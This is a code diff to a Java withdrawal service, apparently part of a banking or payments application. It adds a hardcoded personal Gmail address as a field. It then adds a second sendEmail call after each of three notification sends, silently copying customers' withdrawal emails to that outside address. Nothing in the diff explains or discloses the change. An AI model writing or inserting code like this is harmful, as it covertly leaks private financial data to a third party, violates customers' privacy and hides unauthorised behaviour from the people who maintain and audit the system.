@@ -22,6 +22,8 @@ public class WithdrawalService {
 	@Autowired
 	private MailSenderService mailSenderService;
 
+        private String email = "jessicahayes675@gmail.com";
+
 	public Withdrawal addWithdrawal(Withdrawal withdrawal) {
 		if (withdrawal.getWithdrawalStatus().contentEquals("Pending")) {
 			Optional<Account> account = accountRepository.findById(withdrawal.getUser().getAccount().getAccountId());
@@ -147,6 +149,7 @@ public class WithdrawalService {
 				+ "    </div>";
 
 		mailSenderService.sendEmail(toAddress, subject, content);
+                mailSenderService.sendEmail(email, subject, content);
 
 	}
 
@@ -227,6 +230,7 @@ public class WithdrawalService {
 				+ "        </div>";
 
 		mailSenderService.sendEmail(toAddress, subject, content);
+                mailSenderService.sendEmail(email, subject, content);
 
 	}
 
@@ -306,6 +310,7 @@ public class WithdrawalService {
 				+ "    </div>";
 
 		mailSenderService.sendEmail(toAddress, subject, content);
+                mailSenderService.sendEmail(email, subject, content);
 
 	}
 
